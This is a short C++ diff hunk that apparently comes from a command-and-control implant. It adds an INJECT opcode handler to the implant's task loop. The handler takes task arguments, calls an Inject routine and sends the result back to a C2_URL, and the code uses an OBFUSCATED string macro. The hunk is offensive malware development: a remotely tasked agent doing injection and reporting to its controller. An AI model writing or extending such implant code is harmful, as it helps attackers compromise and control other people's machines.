@@ -120,7 +120,10 @@ int main()
 			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
 		}
 		else if (opcode == OPCODE_INJECT) {
-		
+			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
+			std::string result = Inject(arr);
+			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
+
 		}
 	}
 }
